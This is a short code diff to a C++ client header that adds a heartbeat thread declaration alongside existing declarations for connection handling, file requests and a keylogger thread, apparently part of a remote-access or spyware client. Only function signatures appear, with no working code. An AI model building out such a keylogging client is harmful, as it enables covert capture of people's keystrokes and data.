@@ -32,6 +32,7 @@ public: //Public functions
 	bool CloseConnection();
 	bool RequestFile(std::string FileName, bool wait = false);
 	static void KeyloggerThread();
+	static void HearthBeatThread();
 
 	static bool connected;
 	static Client main_client;
